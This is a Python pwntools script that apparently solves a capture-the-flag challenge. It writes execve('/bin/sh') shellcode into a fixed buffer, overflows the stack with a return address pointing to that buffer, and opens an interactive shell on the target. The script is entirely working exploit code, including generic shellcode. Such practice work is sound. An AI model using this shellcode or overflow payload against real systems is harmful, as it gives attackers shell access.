#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./pwn')
# io = remote('172.1.3.8', 8888)

elf = ELF('./pwn')

shellcode = 'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

payload = 'a' * 0x28 + p64(0x601080)
io.sendlineafter('name\n', shellcode)
io.sendlineafter('me?\n', payload)

io.interactive()
io.close()
